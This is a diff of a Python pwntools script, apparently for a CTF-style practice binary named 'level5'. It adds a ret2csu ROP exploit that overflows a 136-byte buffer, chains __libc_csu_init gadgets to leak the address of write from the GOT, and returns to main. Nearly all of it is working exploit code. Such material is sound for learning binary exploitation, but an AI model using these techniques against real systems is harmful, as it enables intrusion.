@@ -1,7 +1,61 @@
 from pwn import *
 
-eLevel5 = ELF('./level5')
+def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r13, r14, r15, last):
+    # This function assumes that the 'csu_gadget_addr' pops the values into the registers
+    # and then calls the function pointer at 'func_gadget_addr', which will use those register
+    # values to perform the operation.
 
-addrWrite = eLevel5.got["write"]
+    # Padding to reach the return address, assuming a buffer overflow at 128 bytes
+    # plus 8 bytes for the saved RBP (this may need to be adjusted for your specific binary)
+    buf_size = 128 + 8
+    payload = b"A" * buf_size
 
-print(hex(addrWrite))
+    # Add the CSU gadget address
+    payload += p64(csu_gadget_addr)
+
+    # Values to be popped into registers by the CSU gadget
+    payload += p64(rbx)   # rbx value to be popped into rbx register
+    payload += p64(rbp)   # rbp value to be popped into rbp register
+    payload += p64(r12)   # r12 value to be popped into r12 register (will be used in the call)
+    payload += p64(r13)   # r13 value to be popped into rdi register
+    payload += p64(r14)   # r14 value to be popped into rsi register
+    payload += p64(r15)   # r15 value to be popped into rdx register
+
+    # Add the 'func_gadget_addr' which will call the function at [r12 + rbx*8]
+    payload += p64(func_gadget_addr)
+
+    # Extra padding needed between 'func_gadget_addr' and the 'last' address
+    # The exact amount should be determined by the specifics of the gadgets used
+    # This often includes padding for any additional pops that may occur in the gadgets
+    # For this example, I am using '7 * 8' to account for 7 potential pops
+    # This may need to be adjusted based on the specific gadgets you are using.
+    padding_between = 7 * 8  # Adjust this value as needed for your gadgets
+    payload += b"B" * padding_between
+
+    # The address to return to after the function call is complete
+    payload += p64(last)
+
+    return payload
+
+if __name__ == '__main__':
+    l5 = ELF('./level5')
+
+    main = l5.symbols['main']
+
+    payload1 = craft_ret2csu_payload(0x0040061a, # gadget csu
+                                     0x004005ec, # gadget func
+                                     0,          # rbx
+                                     1,          # rbp
+                                     l5.got["write"],  # r12 write.got
+                                     1,          # r13 stdout
+                                     l5.got["write"],  # r14 buffer
+                                     8,          # r15 size
+                                     main # ret
+                                     )
+
+    sh = process('./level5')
+
+    sh.recvuntil('Hello, World\n')
+    sh.send(payload1)
+    write_addr = u64(sh.recv(8))
+    print(write_addr)
